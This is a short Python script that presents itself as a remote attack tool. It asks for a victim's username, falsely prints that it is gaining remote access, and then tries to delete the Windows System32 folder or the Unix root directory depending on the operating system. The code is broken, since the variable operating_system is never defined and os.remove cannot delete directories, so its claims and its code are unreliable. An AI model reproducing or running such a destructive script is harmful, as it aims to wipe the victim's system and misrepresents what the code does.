import os

def start():
    name = input("Username of victim: ")
    print(f"Getting remote access into {name}'s computer")

def attack():
    if operating_system == "Windows":
       os.remove("\Windows\System32")
    elif operating_system == "Linux":
       os.remove("/")
    elif operating_system == "Darwin":
       os.remove("/")
